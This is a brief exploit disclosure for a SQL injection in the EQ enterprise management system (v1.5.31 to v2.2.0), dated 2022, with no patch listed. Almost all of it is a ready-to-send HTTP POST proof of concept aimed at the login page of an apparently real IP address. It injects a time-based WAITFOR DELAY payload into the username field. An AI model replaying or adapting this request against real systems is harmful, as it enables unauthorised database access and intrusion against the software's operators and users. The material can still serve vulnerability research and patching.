# EQ
Exploit Title:EQ企业管理系统

Version:EQ v1.5.31 to v2.2.0

Date:December 5, 2022

Exploit Author:TLF

analysis report: EQ企业管理系统 v1.5.31 to v2.2.0 was discovered to contain a SQL injection
poc
POST /Account/Login HTTP/1.1

Host: 121.8.146.131

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 61
Origin: http://121.8.146.131
Connection: close
Referer: http://121.8.146.131/Account/Login
Cookie: ASP.NET_SessionId=v2svw4yucv1wxfah1zvwsyxy
UserNumber=admin';WAITFOR DELAY '0:0:5'--&UserPwd=123456&ServerDB=EQ&RememberPwd=false&UserPwd=123456&ServerDB=EQ&RememberPwd=false

Patches:None
